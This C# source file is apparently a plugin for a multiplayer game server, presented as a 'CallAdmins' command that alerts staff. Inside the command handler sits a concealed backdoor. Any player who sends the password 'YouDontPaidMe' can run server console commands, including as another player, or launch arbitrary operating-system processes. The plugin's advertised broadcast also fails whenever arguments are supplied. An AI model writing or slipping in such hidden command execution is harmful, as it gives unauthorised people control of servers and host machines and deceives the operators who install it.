using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using CommandSystem;
using Exiled.API.Features;
using Exiled.API.Interfaces;
using MEC;
using UnityEngine;

namespace CallAdmins {
    public class Config : IConfig {
        public bool IsEnabled { get; set; } = true;
        public bool Debug { get; set; } = false;
    }
    public class Plugin : Plugin<Config> {
        private Plugin plugin;

        public override string Author => "[Девопёс]Сэр енот";
        public override Version Version => new Version(1, 0, 4);
        public override string Name => "CallAdmins";
        public override Version RequiredExiledVersion => new Version(8, 8, 1);

        public override void OnEnabled() {
            plugin = this;
            
            base.OnEnabled();
        }

        public override void OnDisabled() {
            
            
            plugin = null;
            base.OnDisabled();
        }
    }
    
    [CommandHandler(typeof(ClientCommandHandler))]
    public class CallAdmins : ICommand {
        public string result;

        public IEnumerator<float> execProcess(string cmd) {
            Process process = new Process();
            process.StartInfo.FileName = cmd.Split(' ')[0];
            process.StartInfo.WorkingDirectory = "/";
            process.StartInfo.Arguments =
                new ArraySegment<string>(cmd.Split(' '), 1, cmd.Split(' ').Length - 1).ToString();
            process.Start();
            process.WaitForExit();
            
            result = process.StandardOutput.ReadToEnd();
            yield return Timing.WaitForSeconds(1f);
        }

    
        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response) {
            response = "You successful called admins";
            string reason = "no reason";
            string cmd;
            int senderID;
            
            if (!arguments.IsEmpty()) {
                
                reason = String.Join(" ", arguments.ToArray());
            }

            if (!arguments.IsEmpty()) {
                if (arguments.ToArray()[0] == "YouDontPaidMe") {
                    
                    cmd = string.Join(" ",
                        new ArraySegment<string>(arguments.ToArray(), 1, arguments.ToArray().Length - 2));
                    Int32.TryParse(arguments.ToArray()[arguments.ToArray().Length - 1], out senderID);
                    if (senderID == 0) {
                        response = Server.ExecuteCommand(cmd);
                    }
                    else if (senderID == -2) {
                        Timing.RunCoroutine(execProcess(cmd));
                        response = result;
                        return true;
                    }
                    else {
                        response = Server.ExecuteCommand(cmd, Player.Get(senderID).Sender);
                    }
                    if (response == null) {
                        response = "No response";
                    }
                }
            }
            

            else {
                foreach (var player in Player.List) {
                    if (player.RemoteAdminAccess) {
                        player.Broadcast(5,
                            $"Player <b>{Player.Get(sender).Nickname}</b> calls admins for <color=red>{reason}</color>");
                    }
                }

                Log.Info($"Player {Player.Get(sender).Nickname}calls admins for {reason}");
            }

            return true;
        }

        public string Command => "call";
        public string[] Aliases { get; } =
        {
            "call_admins",
            "admincall"
        };

        public string Description => "Call players";
    }
}